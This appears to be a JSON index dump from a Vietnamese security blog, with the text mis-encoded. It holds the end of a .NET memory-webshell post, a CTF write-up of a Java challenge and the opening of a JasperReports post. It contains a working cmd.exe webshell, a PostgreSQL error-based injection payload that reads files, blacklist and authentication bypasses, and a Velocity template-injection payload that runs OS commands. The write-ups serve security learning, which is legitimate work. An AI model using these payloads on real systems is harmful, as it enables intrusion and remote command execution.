\u0026#34;ASP.httpmodulememshell_aspx+ModuleMemShell.CustomHandler\u0026#34;){ ListIExecutionStepClass.GetMethod(\u0026#34;RemoveAt\u0026#34;, flag).Invoke(list, new object[] { i }); } } } } public void CustomHandler(object sender, EventArgs e){ HttpContext context = HttpContext.Current; String cmd = context.Request.QueryString[\u0026#34;command\u0026#34;]; if (cmd != null){ Process p = new Process(); p.StartInfo.FileName = \u0026#34;cmd.exe\u0026#34;; p.StartInfo.Arguments = \u0026#34;/c\u0026#34; + cmd; p.StartInfo.UseShellExecute = false; p.StartInfo.RedirectStandardOutput = true; p.StartInfo.RedirectStandardError = true; p.Start(); byte[] data = Encoding.UTF8.GetBytes(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd()); context.Response.Write(Encoding.Default.GetString(data)); } } } \u0026lt;/script\u0026gt; \u0026lt;% new ModuleMemShell(); %\u0026gt; Cuá»‘i cÃ¹ng lÃ  exec command táº¡i Ä‘Æ°á»ng dáº«n báº¥t ká»³: CÃ³ má»™t lÆ°u Ã½ nhÆ° sau: Khi load memshell nÃ y báº±ng file ashx hoáº·c deser, code inject thÃ¬ cáº§n sá»­a Ä‘á»•i handler_name cho phÃ¹ há»£p Ä‘á»ƒ code mÃ¬nh cÃ³ thá»ƒ xÃ³a Ä‘Æ°á»£c Ä‘Ãºng event, táº¡i Ä‘Ã¢y mÃ¬nh Ä‘ang vÃ­ dá»¥ load memshell code báº±ng file aspx.\n","date":"2026-01-12T00:00:00Z","permalink":"https://kev1n1203.github.io/p/memshell-dotnet/","title":"Memory Webshell in .NET Framework"},{"content":"MÃ¬nh nghÄ© cÅ©ng pháº£i 8 thÃ¡ng sau bÃ i wu gáº§n nháº¥t, khÃ´ng pháº£i lÃ  do mÃ¬nh khÃ´ng chÆ¡i ná»¯a, mÃ  lÃ  do mÃ¬nh lÆ°á»i. MÃ£i sau khi thi xong SVANM, mÃ¬nh má»›i tháº¥y lÃ  mÃ¬nh nÃªn táº­p tÃ nh viáº¿t trá»Ÿ láº¡i, nÃªn Ä‘Ã¢y sáº½ lÃ  hÃ nh trÃ¬nh thi trong 8 tiáº¿ng cá»§a mÃ¬nh hÆ¡n lÃ  má»™t writeup thuáº§n tÃºy.\nLÃ  má»™t sinh viÃªn nÄƒm 4(.5) chuáº©n bá»‹ ra trÆ°á»ng may máº¯n Ä‘Æ°á»£c lá»±a chá»n Ä‘á»ƒ Ä‘i thi Sinh ViÃªn An Ninh Máº¡ng, tiá»n thÃ¢n lÃ  Sinh ViÃªn vá»›i An ToÃ n ThÃ´ng tin. Cho nÃªn Ä‘Ã¢y lÃ  láº§n Ä‘áº§u cÅ©ng lÃ  láº§n cuá»‘i mÃ¬nh cÃ³ thá»ƒ tham gia cuá»™c thi nÃ y.\nÄiá»u Ä‘áº·c biá»‡t lÃ  chung kháº£o nÄƒm nay lÃ  khÃ´ng thi theo kiá»ƒu Attack-Defend truyá»n thá»‘ng mÃ  sá»­ dá»¥ng format nÄƒm 2020-2021: King Of The Hill. NÃ³i nÃ´m na thÃ¬ nÃ³ lÃ  jeo, ai solve nhanh nháº¥t sáº½ Ä‘Æ°á»£c Ä‘iá»ƒm cá»§a 1 round - 100 Ä‘iá»ƒm. CÃ¡c challenge cÃ³ cÃ¡c cÃ¡ch patch khÃ¡c nhau, cÃ¡c Ä‘á»™i cÃ²n láº¡i náº¿u muá»‘n khai thÃ¡c thÃ¬ sáº½ pháº£i Ä‘á»£i round sau hoáº·c unpatch Ä‘á»ƒ attack.\nPháº§n King of the Hill cÃ³ 2 challenge web, mÃ¬nh nhÃ¬n tháº¥y challenge 1 cáº§n tÃ i khoáº£n Azure vÃ  review source code 1 há»“i tháº¥y khoai lang vÃ£o nÃªn bá» luÃ´n ğŸ—¿. Do Ä‘Ã³ mÃ¬nh chá»‰ cÃ²n 1 chall web Ä‘á»ƒ giÃ nh giáº­t Ä‘iá»ƒm lÃ  challenge thá»© 2: Breach\nBreach Má»™t challenge Java khÃ´ng outbound vá»›i docker cho flag vÃ o cáº£ 2 service web lÃ  db, kháº£ nÄƒng sáº½ cÃ³ 2 cÃ¡ch Ä‘á»ƒ láº¥y flag: Author cÅ©ng cung cáº¥p cÃ¡ch Ä‘á»ƒ patch challenge lÃ  sáº½ patch táº¡i 2 file: patchme.groovy vÃ  patchme.jsp. CÃ¡c file jsp sáº½ inlcude file patchme.jsp, tÆ°Æ¡ng tá»± vá»›i groovy: SQL Injection In Function Ngay sau khi báº¯t Ä‘áº§u cuá»™c thi, mÃ¬nh vÃ  teammate Ä‘Ã£ ngá»“i vÃ o lÃ m luÃ´n challenge 2 vÃ  spot tháº¥y sql injection táº¡i detail_services.jsp:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;% String service_name = request.getParameter(\u0026#34;service_name\u0026#34;); if(service_name == null) service_name = \u0026#34;\u0026#34;; if (!isSafeArgument(service_name)) { return; } PreparedStatement ps = null; ResultSet rs = null; try { String sql = \u0026#34;SELECT * FROM get_service_details_dynamic(?)\u0026#34;; ps = conn.prepareStatement(sql); ps.setString(1, service_name); rs = ps.executeQuery(); %\u0026gt; Function get_service_details_dynamic Ä‘Æ°á»£c ná»‘i chuá»—i vÃ o cÃ¢u lá»‡nh SELECT, ngon á»“i:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 CREATE OR REPLACE FUNCTION get_service_details_dynamic(p_service_name VARCHAR) RETURNS TABLE( service_name VARCHAR, feature VARCHAR, description TEXT ) AS $$ DECLARE sql_query TEXT; BEGIN -- Build the SQL string sql_query := \u0026#39;SELECT s.name AS service_name, d.feature, d.description \u0026#39; || \u0026#39;FROM public.detail_services d \u0026#39; || \u0026#39;JOIN public.services s ON d.service_id = s.id \u0026#39; || \u0026#39;WHERE s.name ILIKE \u0026#39;\u0026#39;%\u0026#39;||p_service_name||\u0026#39;%\u0026#39;\u0026#39;\u0026#39;; -- Execute the dynamic SQL and return results RETURN QUERY EXECUTE sql_query; END; $$ LANGUAGE plpgsql; Tháº­t ra cÃ²n 2 function ná»‘i chuá»—i ná»¯a trong source code, nhÆ°ng cÃ³ 1 function khÃ´ng gá»i Ä‘áº¿n, cÃ²n 1 function nháº­n Ä‘áº§u vÃ o lÃ  int nÃªn mÃ¬nh cÅ©ng khÃ´ng Ä‘á»ƒ Ã½ láº¯m mÃ  xem param nÃ y bá»‹ filter cÃ¡i gÃ¬ táº¡i isSafeArgument(service_name)\n1 2 3 4 5 6 7 8 9 private String[] blackLists = {\u0026#34;pg_\u0026#34;, \u0026#34;chr\u0026#34;, \u0026#34;select\u0026#34;, \u0026#34;insert\u0026#34;, \u0026#34;update\u0026#34;, \u0026#34;copy\u0026#34;, \u0026#34;lo_\u0026#34;, \u0026#34;program\u0026#34;, \u0026#34;xml\u0026#34;, \u0026#34;;\u0026#34;}; public boolean isSafeArgument(String input) { for (String keyword: blackLists) { if (input.toLowerCase().contains(keyword.toLowerCase())) { return false; } } return true; } Vá»›i kiá»ƒu filter nÃ y lowercase rá»“i contains thÃ¬ khÃ³ á»“i =)), mÃ¬nh ngá»“i loay hoay tÃ¬m trick 1 lÃºc khÃ´ng ra gÃ¬ thÃ¬ nhá»› láº¡i trong Ä‘á»‘ng function Ä‘Æ°á»£c khai bÃ¡o cÃ³ 1 function khÃ´ng sá»­ dá»¥ng trong code:\n1 2 3 4 5 6 7 8 9 10 11 CREATE OR REPLACE FUNCTION sdecode(encoded TEXT) RETURNS TEXT AS $$ DECLARE sql_query TEXT; result TEXT; BEGIN sql_query := \u0026#39;SELECT convert_from(decode(\u0026#39;\u0026#39;\u0026#39;||encoded||\u0026#39;\u0026#39;\u0026#39;, \u0026#39;\u0026#39;base64\u0026#39;\u0026#39;), \u0026#39;\u0026#39;UTF8\u0026#39;\u0026#39;)\u0026#39;; EXECUTE sql_query INTO result; RETURN result; END; $$ LANGUAGE plpgsql; Thay vÃ¬ lá» má» Ä‘i kiáº¿m trick bypass, mÃ¬nh sáº½ gá»i Ä‘áº¿n sdecode Ä‘á»ƒ sqli vÃ o trong hÃ m nÃ y, vá»›i Ã½ tÆ°á»Ÿng lÃ  payload truyá»n vÃ o sáº½ Ä‘Æ°á»£c base64 xong rá»“i má»›i Ä‘Æ°a vÃ o sdecode:\n1 2 3 4 5 6 7 8 9 10 it_db=# select convert_from(decode(\u0026#39;UVE9PScsICdiYXNlNjQnKSwgJ1VURjgnKXx8Y2FzdCh2ZXJzaW9uKCkgYXMgbnVtZXJpYyktLQ==\u0026#39;, \u0026#39;base64\u0026#39;), \u0026#39;UTF8\u0026#39;); convert_from --------------------------------------------------------- QQ==\u0026#39;, \u0026#39;base64\u0026#39;), \u0026#39;UTF8\u0026#39;)||cast(version() as numeric)-- (1 row) it_db=# select sdecode(convert_from(decode(\u0026#39;UVE9PScsICdiYXNlNjQnKSwgJ1VURjgnKXx8Y2FzdCh2ZXJzaW9uKCkgYXMgbnVtZXJpYyktLQ==\u0026#39;, \u0026#39;base64\u0026#39;), \u0026#39;UTF8\u0026#39;)); ERROR: invalid input syntax for type numeric: \u0026#34;PostgreSQL 13.23 (Debian 13.23-1.pgdg13+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 14.2.0-19) 14.2.0, 64-bit\u0026#34; CONTEXT: SQL statement \u0026#34;SELECT convert_from(decode(\u0026#39;QQ==\u0026#39;, \u0026#39;base64\u0026#39;), \u0026#39;UTF8\u0026#39;)||cast(version() as numeric)--\u0026#39;, \u0026#39;base64\u0026#39;), \u0026#39;UTF8\u0026#39;)\u0026#34; PL/pgSQL function sdecode(text) line 7 at EXECUTE Vá»›i viá»‡c flag náº±m á»Ÿ /flag.txt, mÃ¬nh chá»‰ cáº§n thay version() thÃ nh pg_read_file() lÃ  cÃ³ thá»ƒ leak flag qua error based rá»“i:\n1 2 3 4 it_db=# select sdecode(convert_from(decode(\u0026#39;UVE9PScsICdiYXNlNjQnKSwgJ1VURjgnKXx8Y2FzdCgoc2VsZWN0IHBnX3JlYWRfZmlsZSgnL2ZsYWcudHh0JykpIGFzIG51bWVyaWMpLS0=\u0026#39;, \u0026#39;base64\u0026#39;), \u0026#39;UTF8\u0026#39;)); ERROR: invalid input syntax for type numeric: \u0026#34;CSCV2025{fake_flag_for_testing}\u0026#34; CONTEXT: SQL statement \u0026#34;SELECT convert_from(decode(\u0026#39;QQ==\u0026#39;, \u0026#39;base64\u0026#39;), \u0026#39;UTF8\u0026#39;)||cast((select pg_read_file(\u0026#39;/flag.txt\u0026#39;)) as numeric)--\u0026#39;, \u0026#39;base64\u0026#39;), \u0026#39;UTF8\u0026#39;)\u0026#34; PL/pgSQL function sdecode(text) line 7 at EXECUTE MÃ¬nh solve khÃ¡ muá»™n, váº«n sau 2 team nÃªn sau khi ra flag á»Ÿ challenge pháº£i giÃ nh giáº­t submit máº¥y round má»›i Äƒn Ä‘Æ°á»£c 1 round: CÃ¡c round Ä‘áº§u thÃ¬ cÃ¡c váº«n chÆ°a cÃ³ patch nÃ o, cho Ä‘áº¿n khi mÃ¬nh nhÃ¬n máº·t Ä‘Æ°á»£c payload vÃ  báº¯t Ä‘áº§u patch chuáº©n chá»‰ thÃ¬ bá»‹ 1 team unshield xong Ä‘á»›p cÃ¡i patch. ThÃ nh ra giá» mÃ¬nh pháº£i bypass cÃ¡i patch cá»§a chÃ­nh mÃ¬nh, hoáº·c lÃ  Ä‘i tÃ¬m bug khÃ¡c. Trong lÃºc submit, mÃ¬nh vÃ  team mÃ¬nh liÃªn tá»¥c submit cháº­m hÆ¡n cÃ¡c team khÃ¡c khÃ´ng chá»‰ á»Ÿ category web mÃ  cÃ²n á»Ÿ cÃ¡c chall pwn. LÃºc thÃ¬ bá»‹ rate limit, lÃºc thÃ¬ owner already updated!!! tá»©c Ä‘Ã£ cÃ³ team khÃ¡c submit rá»“i, cháº§y cháº­t mÃ£i má»›i cÃ³ thá»ƒ giÃ nh láº¡i Ä‘Æ°á»£c thÃ¬ cÅ©ng khÃ´ng tá»“n táº¡i Ä‘Æ°á»£c quÃ¡ 1 2 round. Team mÃ¬nh khÃ¡ cay vÃ  pháº£i liÃªn tá»¥c sá»­a script, thÃªm sleep Ä‘á»ƒ khÃ´ng bá»‹ ratelimit nhÆ°ng váº«n khÃ´ng Äƒn thua ğŸ—¿ Vá» sau, cÃ³ má»™t sá»‘ cÃ¡ch patch mÃ  teammate mÃ¬nh Ä‘Ã£ bypass nhÆ°:\n1 2 3 4 5 )) =\u0026gt; )/**/) \u0026#39; and vÃ  \u0026#39; or =\u0026gt; \u0026#39;||(payload)||\u0026#39; convert =\u0026gt; encode \u0026#39;string\u0026#39; =\u0026gt; $$string$$ $$string$$ =\u0026gt; $quote$string$quote$ Ref: https://hackmd.io/@Chivato/rkHvEMHUI Táº¡i nhá»¯ng round cuá»‘i, khi báº£n patch Ä‘Ã£ khÃ¡ cháº·t thÃ¬ chá»‰ cÃ²n team mÃ¬nh vÃ  1 team khÃ¡c cÃ³ thá»ƒ bypass patch nÃªn 2 anh em cá»© chia nhau má»—i ngÆ°á»i 1 round. VÃ¬ mÃ¬nh khÃ´ng biáº¿t payload cá»§a há», cÅ©ng nhÆ° khÃ´ng muá»‘n Ä‘á»ƒ lá»™ payload cá»§a báº£n thÃ¢n nÃªn mÃ¬nh Ä‘Ã£ chá»n sá»­ dá»¥ng láº¡i báº£n patch mÃ  chá»‰ 2 Ä‘á»™i cÃ³ thá»ƒ bypass Ä‘Æ°á»£c, khÃ¡ cá»“ng ká»nh. VÃ  Ä‘áº¿n gáº§n káº¿t thÃºc cuá»™c thi (cháº¯c cÃ²n 3 round), mÃ¬nh má»›i hÆ¡i lá» má» tÃ¬m Ä‘Æ°á»£c Ä‘Æ°á»ng Ä‘á»ƒ exploit vuln thá»© 2.\nBypass Auth to SSTI Bypass Authen Äá»ƒ phÃ¢n tÃ­ch Ä‘Æ°á»£c vuln nÃ y thÃ¬ mÃ¬nh báº¯t buá»™c cáº§n pháº£i setup debug, mÃ¬nh ote láº¡i má»™t vÃ i bÆ°á»›c nhÆ° sau:\nChá»‰nh láº¡i Dockerfile cá»§a tomcat 1 2 ENV JAVA_TOOL_OPTIONS -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005 EXPOSE 5005 Bá» service nginx Ä‘á»ƒ vÃ o tháº³ng tomcat cho tiá»‡n, Ä‘á»“ng thá»i expose port 5005 ra ngoÃ i 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 web: container_name: web build: context: . dockerfile: web/Dockerfile volumes: - ./flag.txt:/flag.txt:ro restart: unless-stopped ports: - \u0026#34;8080:8080\u0026#34; - \u0026#34;5005:5005\u0026#34; depends_on: - postgres networks: - internet - no-internet Khi Ä‘Ã£ tháº¥y remote debug connected mÃ  Ä‘áº·t breakpoint khÃ´ng Äƒn thÃ¬ cÃ³ thá»ƒ lÃ  do chÆ°a chá»n class lÃ  code base, Ä‘á»ƒ set thÃ¬ mÃ¬nh vÃ o Project Structure. Táº¡i tab Modules chá»n pháº§n Dependencies, thÃªm folder classes vÃ o vá»›i option lÃ  JARs or Directories lÃ  oke:\nTrong web.xml khai bÃ¡o cÃ¡c file truy cáº­p tá»« Ä‘Æ°á»ng dáº«n /admin Ä‘á»u sáº½ Ä‘i qua 2 class AuthFilter vÃ  WafFilter: 1 2 3 4 5 6 7 8 \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;AuthFilter\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;/admin/*\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;WafFilter\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;/admin/*\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt; Class AuthFilter yÃªu cáº§u má»—i request Ä‘i vÃ o Ä‘á»u cÃ³ username vÃ  password, biáº¿n format lÃ  cÃ¡ch thá»©c hash máº­t kháº©u Ä‘á»ƒ so khá»›p, náº¿u khÃ´ng cÃ³ máº·c Ä‘á»‹nh lÃ  sha1: Náº¿u nhÆ° format Ä‘Æ°á»£c truyá»n vÃ o thÃ¬ pháº£i náº±m trong sha1,md5,sha256,sha512, náº¿u khÃ´ng sáº½ bÃ¡o lá»—i ngay: Check chÃ¡n chÃª r má»›i Ä‘áº¿n Ä‘oáº¡n check thÃ´ng tin ngÆ°á»i dÃ¹ng táº¡i InMemoryUserDB#verifyUser: HÃ m nÃ y check username trÆ°á»›c báº±ng cÃ¡ch láº¥y password cá»§a user tÆ°Æ¡ng á»©ng. Sau Ä‘Ã³ so khá»›p máº­t kháº©u lÆ°u trá»¯ vá»›i máº­t kháº©u truyá»n vÃ o Ä‘Æ°á»£c hash báº±ng format ta Ä‘iá»u chá»‰nh. Äá»“ng thá»i this.users lÃ  má»™t map chá»©a má»—i admin, nÃªn loáº¡i bá» viá»‡c crack hash: Qua 1 vÃ²ng if, tiáº¿p tá»¥c kiá»ƒm tra thuá»™c tÃ­nh protect lÃ  true thÃ¬ kiá»ƒm tra role, khÃ´ng pháº£i admin thÃ¬ tráº£ vá» lá»—i role, cuá»‘i cÃ¹ng náº¿u dpFilter lÃ  true thÃ¬ má»›i tiáº¿p tá»¥c xá»­ lÃ½: Thuá»™c tÃ­nh protect Ä‘Æ°á»£c set báº±ng logic sau:\nLáº¥y URI cá»§a request, split tá»«ng thÆ° má»¥c theo dáº¥u \u0026ldquo;/\u0026rdquo; Set page_type máº·c Ä‘á»‹nh rá»—ng, náº¿u nhÆ° tÃªn file cÃ³ nhiá»u hÆ¡n 2 dáº¥u . thÃ¬ láº¥y extension sau dáº¥u cháº¥m cuá»‘i cÃ¹ng Check náº¿u page_type náº±m trong protectedPages thÃ¬ set lÃ  true, khÃ´ng thÃ¬ lÃ  false Máº·c Ä‘á»‹nh truyá»n vÃ o file thÃ´ng thÆ°á»ng nhÆ°: /admin/index.tpl thÃ¬ máº·c Ä‘á»‹nh page_type lÃ  \u0026quot;\u0026quot; =\u0026gt; chuá»—i nÃ o mÃ  cháº£ contains \u0026quot;\u0026quot; nÃªn máº·c Ä‘á»‹nh protect lÃ  true: NhÆ° váº­y, Ä‘á»ƒ bypass auth thÃ¬ pháº£i khÃ´ng Ä‘Æ°á»£c Ä‘á»ƒ doFilter lÃ  false, Ä‘á»ƒ lÃ m Ä‘Æ°á»£c Ä‘iá»u Ä‘Ã³ thÃ¬: Bypass verifyUser\nDebug ká»¹ hÆ¡n, ta tháº¥y vÃ²ng if Ä‘áº§u cÃ³ block try/catch, mÃ  náº¿u nhÆ° rÆ¡i vÃ o catch thÃ¬ doFilter sáº½ khÃ´ng bá»‹ set thÃ nh false:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 if (username != null \u0026amp;\u0026amp; password != null) { try { String format = request.getParameter(\u0026#34;format\u0026#34;); if (format == null || format.isEmpty()) { format = \u0026#34;sha1\u0026#34;; } if (!\u0026#34;sha1,md5,sha256,sha512\u0026#34;.contains(format)) { msg = \u0026#34;format does not support\u0026#34;; doFilter = false; resp.sendRedirect(\u0026#34;/home/_error.page?errorMsg=\u0026#34; + URLEncoder.encode(msg, StandardCharsets.UTF_8)); } else { boolean auth = this.userDB.verifyUser(username, password, format); try { if (auth) { ... } else { String msg = \u0026#34;auth failed1!\u0026#34;; doFilter = false; resp.sendRedirect(\u0026#34;/home/_error.page?errorMsg=\u0026#34; + URLEncoder.encode(msg, StandardCharsets.UTF_8)); } } catch (Exception var17) { String msg = \u0026#34;auth failed2!\u0026#34;; doFilter = false; resp.sendRedirect(\u0026#34;/home/_error.page?errorMsg=\u0026#34; + URLEncoder.encode(msg, StandardCharsets.UTF_8)); } } } catch (Exception var18) { var18.printStackTrace(); System.out.println(\u0026#34;error trying to authenticate: \u0026#34; + var18.getMessage()); } CÃ¢u há»i lÃ  lÃ m tháº¿ nÃ o Ä‘á»ƒ raise Exception var18 mÃ  khÃ´ng bá»‹ rÆ¡i vÃ o cÃ¡c exception khÃ¡c? CÃ¢u tráº£ lá»i sáº½ náº±m á»Ÿ biáº¿n format, Ä‘oáº¡n kiá»ƒm tra Ä‘áº§u vÃ o cá»§a format cÃ³ váº¥n Ä‘á», cá»¥ thá»ƒ lÃ  dÃ²ng:\n1 if (!\u0026#34;sha1,md5,sha256,sha512\u0026#34;.contains(format)) GiÃ¡ trá»‹ Ä‘Æ°á»£c check Ä‘á»ƒ contains trong chuá»—i kia, náº¿u nhÆ° ta truyá»n vÃ o ,sha512 thÃ¬ sao? Äoáº¡n check if contains sáº½ Ä‘Æ°á»£c pass, chÆ°Æ¡ng trÃ¬nh gá»i Ä‘áº¿n verifyUser: Táº¡i Ä‘Ã¢y máº­t kháº©u Ä‘Æ°á»£c láº¥y tá»« user tÆ°Æ¡ng á»©ng, khÃ´ng sáº½ return false =\u0026gt; auth failed1! NÃªn username truyá»n vÃ o cáº§n pháº£i lÃ  admin. HÃ m check tiáº¿p tá»¥c nháº£y vÃ o hÃ m hashPassword: HÃ m hashPassword sáº½ check format truyá»n vÃ o cÃ³ pháº£i má»™t thuáº­t toÃ¡n hash há»£p lá»‡ trong MessageDigest khÃ´ng: Do ,sha512 khÃ´ng valid nÃªn sáº½ raise exception ,sha512 MessageDigest not available, tá»« Ä‘Ã³ bypass Ä‘Æ°á»£c Ä‘oáº¡n whitelist if Ä‘áº§u: Set protect = false\nXem láº¡i web.xml, cÃ¡c file cÃ³ extension nhÆ° sau Ä‘Æ°á»£c handle bá»Ÿi class EditContentParser\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;EditContentParser\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;io.breach.EditContentParser\u0026lt;/servlet-class\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;EditContentParser\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;*.groovy\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;EditContentParser\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;*.page\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;EditContentParser\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;*.tpl\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;EditContentParser\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;*.htm\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; Khi gáº·p cÃ¡c file nÃ y, class call method service, thá»±c hiá»‡n parse URI Ä‘á»ƒ láº¥y ra tÃªn file cáº§n hiá»ƒn thá»‹. NhÆ°ng váº¥n lÃ  á»Ÿ Ä‘Ã¢y page_type láº¡i Ä‘Æ°á»£c láº¥y lÃ  pháº§n tá»­ tiÃªn sau dáº¥u cháº¥m, ngÆ°á»£c láº¡i vá»›i logic xá»­ lÃ½ protect: Äá»ƒ protect lÃ  false, ta cáº§n pháº£i truyá»n vÃ o file cÃ³ 2 extension:\nExtension thá»© 2 khÃ´ng pháº£i lÃ  groovy =\u0026gt; page, tpl, htm Ä‘á»u Ä‘Æ°á»£c Extension thá»© nháº¥t lÃ  extension Ä‘Ãºng cá»§a file cáº§n truy cáº­p Káº¿t há»£p cáº£ 2 Ä‘iá»u kiá»‡n, ta cÃ³ request bypass authen Ä‘á»ƒ truy cáº­p file /admin/index.html: SSTI In Velocity Trong cÃ¡c file cÃ³ thá»ƒ truy cáº­p, tá»“n táº¡i editPage.groovy cho phÃ©p táº¡o file .page cÃ³ ná»™i dung tÃ¹y Ã½ truy cáº­p Ä‘Æ°á»£c tá»« webroot =\u0026gt; SSTI Velocity: Váº¥n Ä‘á» cÃ²n láº¡i lÃ  bypass Ä‘á»‘ng blacklist nÃ y ná»¯a thÃ´i:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 private static final List\u0026lt;String\u0026gt; BLACKLIST = Arrays.asList(\u0026#34;runtime\u0026#34;, \u0026#34;processbuilder\u0026#34;, \u0026#34;eval\u0026#34;, \u0026#34;forName\u0026#34;, \u0026#34;scriptEngine\u0026#34;, \u0026#34;parse\u0026#34;, \u0026#34;include\u0026#34;); private boolean containsBlacklisted(String input) { if (input == null) { return false; } else { String lower = input.toLowerCase(); Iterator var3 = BLACKLIST.iterator(); String forbidden; do { if (!var3.hasNext()) { return false; } forbidden = (String)var3.next(); } while(!lower.contains(forbidden.toLowerCase())); return true; } } Äa sá»‘ cÃ¡c payload Velocity SSTI Ä‘á»u dÃ¹ng forName Ä‘á»ƒ call class, Ä‘á»ƒ bypass thÃ¬ mÃ¬nh Ä‘Ã£ chá»n sá»­ dá»¥ng classloader. Sau má»™t há»“i fuzz tÃ¹m lum, mÃ¬nh tÃ¬m Ä‘Æ°á»£c object $request chá»©a instance cá»§a class RequestFacade:\nTá»« Ä‘Ã¢y cÃ³ thá»ƒ call Ä‘áº¿n object URLClassLoader thÃ´ng qua payload $request.servletContext.class.classLoader: Viá»‡c khÃ³ Ä‘Ã£ lÃ m Ä‘Æ°á»£c, giá» mÃ¬nh sáº½ dÃ¹ng nÃ³ Ä‘á»ƒ load class java.lang.Runtime, láº¥y command tá»« header 1337:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 #set($cl = $request.servletContext.class.classLoader) #set($rt = $cl.loadClass(\u0026#34;java.lang.Run\u0026#34;+\u0026#34;time\u0026#34;)) #set($g = $rt.getMethod(\u0026#34;getR\u0026#34;+\u0026#34;untime\u0026#34;,null)) #set($r = $g.invoke(null,null)) #set($cmd = $request.getHeader(\u0026#34;1337\u0026#34;)) #set($exec = $rt.getMethod(\u0026#34;exec\u0026#34;,$cl.loadClass(\u0026#34;java.lang.String\u0026#34;))) #set($p = $exec.invoke($r,$cmd)) #set($is = $p.getInputStream()) #set($scClass = $cl.loadClass(\u0026#34;java.util.Scanner\u0026#34;)) #set($sc = $scClass.getConstructor($cl.loadClass(\u0026#34;java.io.InputStream\u0026#34;)).newInstance($is)) #set($del = $scClass.getMethod(\u0026#34;useDelimiter\u0026#34;, $cl.loadClass(\u0026#34;java.lang.String\u0026#34;))) #set($tmp = $del.invoke($sc, \u0026#34;\\\\A\u0026#34;)) #set($next = $scClass.getMethod(\u0026#34;next\u0026#34;)) $next.invoke($sc) Finally, RCE:\nÄá»›p flag trÃªn server:\nRa Ä‘áº¿n bÆ°á»›c nÃ y thÃ¬ cuá»™c thi cÅ©ng káº¿t thÃºc rá»“i, thÃ´i thÃ¬ +1 kiáº¿n thá»©c váº­y\nKáº¿t thÃºc Trong khoáº£ng thá»i gian 8 tiáº¿ng, ngoÃ i challenge web2 thÃ¬ mÃ¬nh cÃ³ vá»c Lucky Star ná»¯a mÃ  khÃ´ng confirm Ä‘Æ°á»£c Ä‘Ã£ RCE con Sharepoint hay chÆ°a, coi nhÆ° lÃ  tá»‘n thÃªm thá»i gian mÃ  khÃ´ng cÃ³ thÃ nh quáº£ gÃ¬. Ngáº­m ngÃ¹i káº¿t thÃºc á»Ÿ vá»‹ trÃ­ thá»© 6, mÃ¬nh cÅ©ng chá»‰ biáº¿t tá»± trÃ¡ch báº£n thÃ¢n thÃ´i ğŸ—¿ ÄÃ¢y lÃ  bÃ i há»c cho báº£n thÃ¢n vá» viá»‡c khÃ´ng chuáº©n bá»‹ kÄ© trÆ°á»›c má»™t format thi má»›i, cÅ©ng nhÆ° sá»± thiáº¿u quyáº¿t Ä‘oÃ¡n khi sá»­ dá»¥ng tool unshield,\u0026hellip; dáº«n Ä‘áº¿n káº¿t quáº£ khÃ´ng nhÆ° mong muá»‘n. Hi vá»ng ráº±ng cÃ¡c khÃ³a sau sáº½ khÃ´ng máº¯c pháº£i sai láº§m nhÆ° mÃ¬nh ná»¯a.\n","date":"2025-11-16T17:28:53Z","permalink":"https://kev1n1203.github.io/p/svanm-2025/","title":"SVANM2025: The End Of Beginning"},{"content":"Khi Ä‘Æ°á»£c tiáº¿p xÃºc vá»›i cÃ¡c há»‡ thá»‘ng code báº±ng Java, mÃ¬nh tháº¥y cÃ³ khÃ¡ nhiá»u website sá»­ dá»¥ng thÆ° viá»‡n JasperReports trong viá»‡c render bÃ¡o cÃ¡o. Tuy lÃ  má»™t cÃ´ng cá»¥ máº¡nh máº½ nhÆ°ng Japser sá»Ÿ há»¯u function mÃ  cÃ³ thá»ƒ lá»£i dá»¥ng Ä‘á»ƒ RCE. NÃªn mÃ¬nh quyáº¿t Ä‘á»‹nh mÃ y mÃ² nÃ³ má»™t chÃºt, cÅ©ng nhÆ° chia sáº» nhá»¯ng kiáº¿n thá»©c mÃ  mÃ¬nh biáº¿t vÃ  tÃ¬m hiá»ƒu Ä‘Æ°á»£c Ä‘Æ°á»£c vá» Jasper.\nCode Injection In Jasper Má»™t chÃºt khÃ¡i niá»‡m Jasper lÃ  má»™t thÆ° viá»‡n cÃ³ má»¥c Ä‘Ã­ch chÃ­nh dÃ¹ng Ä‘á»ƒ render ná»™i dung. ÄÆ°á»£c sá»­ dá»¥ng chá»§ yáº¿u cho viá»‡c chuyá»ƒn Ä‘á»•i tá»« file cÃ³ cáº¥u 